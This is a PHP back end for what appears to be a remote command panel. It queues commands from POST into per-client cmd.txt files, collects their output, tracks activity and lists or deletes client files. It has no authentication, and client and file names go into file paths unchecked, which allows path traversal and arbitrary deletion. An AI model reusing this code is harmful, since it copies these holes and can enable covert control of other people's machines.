<?php 
ob_start();
include("timezones.php");
header('Content-Type: application/json', true);
    function createcmdtxt($path,$cmd){
        $myfile = fopen($path, "w");
        $txt = $cmd;
        fwrite($myfile, $txt);
        fclose($myfile);
    }
if(isset($_POST['getclients'])){
    $clients =array();
    $scan = scandir('clients');
    foreach($scan as $file) {
       if (is_dir("clients/$file")) {
            if ( ($file!=".") and ($file!="..") ){
                array_push($clients,$file);
            }
        }
    }
    ob_end_clean();
    echo json_encode($clients);
}
if(isset($_POST['onlineclients'])){
    $clients =array();
    $scan = scandir('clients');
    foreach($scan as $file) {
        if (is_dir("clients/$file")) {
            $lastactivity=file_get_contents('clients/'.$file."/activity.txt");
            $futureactivity=datenow2('Europe/Athens');
            if ($futureactivity<=$lastactivity){
                if ( ($file!=".") and ($file!="..") ){
                    array_push($clients,$file);
                }
            }
        }
    }
    ob_end_clean();
    echo json_encode($clients);
}
if(isset($_POST['getoutput'])){
    $ac=$_POST['getoutput'];
    $output=file_get_contents('clients/'.$ac."/output.txt");
    createcmdtxt('clients/'.$ac."/output.txt","");
    ob_end_clean();
    echo json_encode($output);
}
if( (isset($_POST['client'])) and (isset($_POST['cmd'])) ){
    $ac=$_POST['client'];
    $cmd=$_POST['cmd'];
    createcmdtxt('clients/'.$ac."/cmd.txt",$cmd);
    ob_end_clean();
    //echo json_encode($cmd);
}
if(isset($_POST['filesview'])){
    $ac=$_POST['filesview'];
    $acpath='clients/'.$ac;
    $data =array();
    $scan = scandir($acpath);
    foreach($scan as $file) {
        if (!is_dir($acpath."/$file")) {
            if ( ($file!=".") and ($file!="..")  and ($file!="output.txt")  and ($file!="cmd.txt")  and ($file!="activity.txt") ){
                array_push($data,$file);
            }
        }
    }
    ob_end_clean();
    echo json_encode($data);
}
if( (isset($_POST['delfile'])) and (isset($_POST['file']))){
    $ac=$_POST['delfile'];
    $acfile=$_POST['file'];
    $acpath='clients/'.$ac.'/'.$acfile;
    try{
        unlink($acpath);
        $data="success";
    }catch(Exception $e){
        $data="Fail";
    }
    ob_end_clean();
    echo json_encode($data);
}
?>